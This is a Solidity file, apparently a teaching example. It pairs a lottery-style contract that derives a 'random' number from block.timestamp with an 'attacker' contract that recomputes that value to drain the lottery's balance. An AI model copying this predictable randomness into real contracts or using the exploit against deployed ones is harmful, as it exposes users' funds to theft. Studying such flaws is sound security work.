//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

contract generate_random{

    fallback() external payable{

    }
    receive() external payable{
    }

    function generate_random_number(uint guess) public {
        uint number = uint(keccak256(abi.encodePacked(block.timestamp)));
        if(guess == number ){
            (bool success, ) = msg.sender.call{value: address(this).balance}("");
            require(success, " failed transfer");
        }
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
contract attacker{

    fallback() external payable{

    }
    receive() external payable{

    }
    function attack(generate_random  random) public payable{
        uint num = uint(keccak256(abi.encodePacked(block.timestamp)));
        random.generate_random_number(num);
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}